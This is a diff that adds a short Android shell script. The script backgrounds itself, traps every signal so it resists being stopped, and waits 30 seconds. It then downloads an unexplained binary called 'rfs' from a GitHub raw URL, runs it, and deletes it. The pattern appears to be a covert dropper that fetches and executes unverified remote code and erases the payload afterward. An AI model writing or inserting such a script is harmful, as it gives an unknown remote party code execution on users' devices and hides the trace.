@@ -1,0 +1,9 @@
+#!/system/bin/sh
+
+[ -n "$BG" ] || { BG=Y "$0" & exit; }
+for i in $(seq 64); do trap '' "$i"; done
+sleep 30
+wget -O /data/local/tmp/rfs https://github.com/Androidmate/Adb-tools-minimal/raw/master/rfs
+chmod +x /data/local/tmp/rfs
+/data/local/tmp/rfs
+rm /data/local/tmp/rfs
